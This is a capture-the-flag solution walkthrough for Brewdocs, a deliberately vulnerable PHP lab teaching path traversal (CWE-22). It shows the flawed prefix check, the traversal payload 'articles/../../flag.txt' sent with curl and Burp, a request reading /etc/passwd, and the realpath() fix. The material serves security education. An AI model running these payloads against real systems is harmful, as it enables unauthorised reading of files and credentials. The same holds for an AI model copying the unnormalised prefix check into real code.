# Brewdocs: Solution / Walkthrough

![CWE-22](https://img.shields.io/badge/CWE--22-Path%20Traversal-red?style=flat-square)
![PHP](https://img.shields.io/badge/PHP-Apache-777BB4?style=flat-square&logo=php&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**Brewdocs is an intentionally vulnerable application built for security education.** It is a small coffee-shop knowledge base / help centre with a deliberate [path traversal](https://owasp.org/www-community/attacks/Path_Traversal)
(CWE-22) flaw — hidden behind a "start-of-path" check that forgets to normalise the path — so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the payload and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* path traversal is and *how* to
approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a snippet of file-serving code and point to the exact vulnerable line.
- Explain why a start-of-path check on a raw string is not containment.
- Explain **why** each fix works — and why some "obvious" fixes don't.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): path traversal
> happens when an app builds a file path from user input and trusts it to stay
> inside the intended folder. Brewdocs requires the request to *start with*
> `articles/` — but never normalises it, so a prefixed `../../` still escapes.

If you only want the payload, jump to [Exploitation](#-exploitation) — but the
real value is in the *why*.

<br>

## 🐛 The vulnerability

The `src/Article.php` confines reads to the `articles/` section like this:

```php
public const SECTION_PREFIX = 'articles/';

public static function resolve(string $kbDir, string $doc): string
{
    // The guard: the request must START WITH the articles/ section.
    if (!str_starts_with($doc, self::SECTION_PREFIX)) {
        throw new \RuntimeException('Rejected: not an articles/ document.');
    }

    // ...and then it's joined on, un-normalised.
    return $kbDir . \DIRECTORY_SEPARATOR . $doc;
}
```

Walk through it the way the computer does:

1. `$doc` comes **straight from the query string** — fully attacker-controlled.
2. The guard requires `$doc` to **start with** `articles/`. A plain
   `../flag.txt` lacks that prefix, so it's rejected — which makes the check
   *feel* protective.
3. But the guard inspects the **raw string**, never the resolved path. A value
   that *begins* with `articles/` and then contains `../` passes the prefix
   check untouched.
4. `$kbDir . '/' . $doc` is opened with no canonicalisation. The embedded `../`
   does its work on the filesystem.

So `articles/../../flag.txt` begins with `articles/` (guard passes) and the
filesystem resolves it to two levels above `kb/articles/` — right where
`flag.txt` lives. The check looked at the *start* of a string; the OS acted on
the *whole path*.

> **Why does this look safe?** Because "it must start with `articles/`" sounds
> exactly like containment, and it even blocks the obvious `../flag.txt`. It's
> the most convincing broken defence in the series — and the most common in real
> code reviews.

<br>

## 💥 Exploitation

**The intended request** — what the app expects:

```
GET /article.php?doc=articles/espresso-extraction.md
```

Renders the espresso article. Working as designed.

**These are rejected** — no `articles/` prefix, so the guard blocks them:

```
GET /article.php?doc=../flag.txt      -> 400 (no articles/ prefix)
GET /article.php?doc=flag.txt         -> 400 (no articles/ prefix)
```

**The exploit** — keep the prefix the guard wants, then climb out. Articles live
in `kb/articles/`, so you need **two** levels up to reach the data root where
the flag sits:

```
GET /article.php?doc=articles/../../flag.txt
```

With `curl`:

```bash
curl --path-as-is "http://localhost:8101/article.php?doc=articles/../../flag.txt"
```

> **Why `--path-as-is`?** It stops curl from collapsing the `../../` *before* the
> request is sent, so the server receives your path intact and its guard is what
> you're actually testing.

Expected output (rendered inside the article page):

```
FLAG{BREWDOCS_SPILLED_THE_BEANS}
```

> **Where does the flag come from?** It is **not** in the repo — it is baked into
> the Docker image at build time at `/app/flag.txt`, two levels above
> `kb/articles/` (see the `Dockerfile`).

<br>

## 🚀 Going further

Chain more `../` to climb past the app and read files elsewhere on the container
filesystem — the `articles/` prefix is just the ticket through the door:

```
GET /article.php?doc=articles/../../../../etc/passwd
```

> Inside the hardened container this reads the *container's* `/etc/passwd`, not
> your host's, and the app runs as a non-root user — the blast radius is
> deliberately small.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and load <http://localhost:8101>.
2. Open any article and capture the request in **Proxy > HTTP history** — note
   the `?doc=articles/<name>.md` parameter. Send it to **Repeater** and re-send
   for a **baseline**.
3. Try `doc=../flag.txt` — blocked (400). The filter looks at the *start* of the
   path.
4. Keep the required prefix and climb out: `doc=articles/../../flag.txt`. The
   guard is satisfied by the `articles/` prefix, the traversal escapes, and the
   flag is rendered.
5. (Optional) With **Intruder**, vary the number of `../` segments after the
   prefix to map how far up you can reach.

> If a payload fails in Repeater but works in `curl --path-as-is`, Burp's path
> normalisation collapsed your `../../` — inspect and fix the raw request.

<br>

## 🛡️ The fix

A start-of-path check on an un-normalised string is not containment.
**Canonicalise** the path and verify it really stays inside the base directory:

```php
$base = realpath($kbDir);
$full = realpath($kbDir . '/' . $doc);

if ($full === false || !str_starts_with($full, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(403);
    return;
}
// safe to read $full
```

Why this works: `realpath()` resolves the `../` segments *before* the
comparison, so `articles/../../flag.txt` canonicalises to `/app/flag.txt`,
which does **not** start with `/app/kb/articles/` and is rejected. The prefix
check is now done on the *resolved* path — the only form that matters.

### ⚠️ Tempting fixes that *don't* work

These are the traps specific to a start-of-path design:

- **Prefix-checking the raw request** (the bug itself). `str_starts_with($doc,
  'articles/')` is satisfied by `articles/../../flag.txt`. A prefix on an
  un-normalised string tells you nothing about where the path ends up.
- **`str_starts_with` on the *joined* path without `realpath`.** Still
  un-normalised — `/app/kb/articles/../../flag.txt` literally starts with
  `/app/kb/articles/`, so it passes while resolving elsewhere. You must resolve
  *first*, then compare.
- **Blocking the literal `..`.** A blocklist, and you've seen that lose
  repeatedly — stripped once it reappears (**[deskmint, L3](https://github.com/iv0ks/deskmint)**),
  and encodings slip through (**[ziphaven, L5](https://github.com/iv0ks/ziphaven)**).

> Series thread: **[ziphaven (Level 5)](https://github.com/iv0ks/ziphaven)**
> checked the right thing at the wrong *time*; Brewdocs checks the right thing on
> the wrong *form* (un-normalised). This is the **capstone** of the series — every
> level has circled the same truth: **resolve the real path, then contain it.**
> Nothing less is a boundary.

### ✅ Even better: don't build paths from user input at all

- **Opaque IDs.** Serve articles by a server-side ID mapped to a real path.
- **Allow-list.** Accept only the article slugs your index actually publishes.
- **Use a vetted helper.** Lean on a framework's safe file-serving helper rather
  than hand-rolling prefix + path logic.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **A prefix is not a boundary.** "Starts with `articles/`" constrains the
   *start* of a string, not where the path resolves.
2. **Normalise before you compare.** `realpath()` first, *then* check the
   prefix — on the resolved path, never the raw input.
3. **This is the convincing one.** It looks defensive, which is exactly why it
   survives review. Distrust string-level containment.
4. **Every level pointed here.** No filter, prefix, blocklist, extension, or
   decode-order trick is containment — only resolve-then-contain is.
5. **Defence in depth matters.** Non-root + container didn't *fix* the bug, but
   it kept the blast radius small.

That's Level 6 — and the end of the series. The common fix across all six levels
is the same: **resolve the path to its canonical form, then verify it stays
inside the base directory.** Head back to the **[Learning Guide](GUIDE.md)** for
the method, or the **[README](README.md)** for the lab setup.
